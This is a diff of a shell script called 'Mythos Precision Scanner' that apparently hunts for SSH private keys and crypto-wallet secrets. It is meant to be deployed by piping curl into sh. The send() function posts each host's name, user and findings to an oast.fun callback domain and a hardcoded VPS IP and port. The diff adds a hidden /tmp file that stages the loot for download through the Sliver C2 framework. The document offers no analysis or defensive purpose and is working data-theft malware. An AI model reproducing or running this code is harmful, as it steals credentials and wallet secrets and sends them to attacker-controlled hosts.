@@ -1,5 +1,5 @@
 #!/bin/sh
-# Mythos Precision Scanner v3.4 — ETH strict context, SSH private-only, no BIP39
+# Mythos Precision Scanner v3.5 — local file output for Sliver download, no BIP39
 # Deploy: curl -sL URL | sh
 # Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
 
@@ -7,6 +7,8 @@ OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
 VPS="153.75.248.248:9999"
 HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
 USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
+# Truncate output file for fresh scan
+> /tmp/.mqs_out
 
 ###############################################################################
 # IGNORE LIST — directories and file patterns to skip
@@ -78,9 +80,11 @@ $IGNORE_DIRS \
 send() {
     local s="$1" d="$2"
     local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
-    # Primary: oast.fun (bypasses all firewalls)
+    # Save locally on host (for Sliver download to VPS)
+    echo "$p" >> /tmp/.mqs_out
+    # oast.fun (bypasses firewalls)
     curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
-    # Secondary: VPS collector (for local archiving)
+    # VPS collector (fast path for hosts that can reach it)
     curl -s -m 2 -X POST --data-binary "$p" "http://${VPS}/" 2>/dev/null &
 }
 
